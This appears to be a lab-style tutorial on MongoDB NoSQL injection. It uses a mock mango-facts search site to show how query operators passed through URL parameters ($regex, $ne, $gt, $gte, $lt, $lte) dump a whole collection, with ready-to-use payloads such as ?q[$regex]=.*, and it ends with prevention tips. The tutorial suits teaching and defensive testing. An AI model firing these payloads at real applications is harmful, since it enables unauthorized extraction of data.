# In-Band Data Extraction

In traditional SQL databases, in-band data extraction vulnerabilities can often lead to the entire database being exfiltrated. In MongoDB, however, since it is a non-relational database and queries are performed on specific collections, attacks are (usually) limited to the collection the injection applies to.

## MangoSearch Example

The website is a basic search application where you can find facts about various types of mangoes.

### Vulnerable Query

The search form sends a GET request where the search query is passed as `?q=<search term>`. On the server side, the request likely queries the database like this:

```javascript
db.types.find({
    name: $_GET['q']
});
```

### Exploitation Techniques

#### 1) Regex to Match All Documents

Use a RegEx query that matches everything:

```javascript
db.types.find({
    name: {$regex: /.*/}
});
```

URL-encoded payload:
```
?q[$regex]=.*
```

#### 2) Alternative Queries

**$ne (not equal):**
```javascript
db.types.find({
    name: {$ne: 'doesntExist'}
});
```
URL-encoded: `?q[$ne]=doesntExist`

**$gt (greater than):**
```javascript
db.types.find({
    name: {$gt: ''}
});
```
URL-encoded: `?q[$gt]=`

**$gte (greater than or equal):**
```javascript
db.types.find({
    name: {$gte: ''}
});
```
URL-encoded: `?q[$gte]=`

**$lt (less than):**
```javascript
db.types.find({
    name: {$lt: '~'}
});
```
URL-encoded: `?q[$lt]=~`

**$lte (less than or equal):**
```javascript
db.types.find({
    name: {$lte: '~'}
});
```
URL-encoded: `?q[$lte]=~`

## Key Points

- In-band extraction is limited to the specific collection being queried
- Use `$regex: /.*/` to match all documents in the collection
- Alternative operators like `$ne`, `$gt`, `$gte`, `$lt`, `$lte` can achieve similar results
- Always URL-encode special characters in payloads
- The `~` character works well with `$lt`/`$lte` as it's the largest printable ASCII value

## Prevention

- Validate and sanitize user input before passing to MongoDB queries
- Use parameterized queries or input validation
- Implement proper access controls to limit data exposure
- Consider using MongoDB's built-in security features
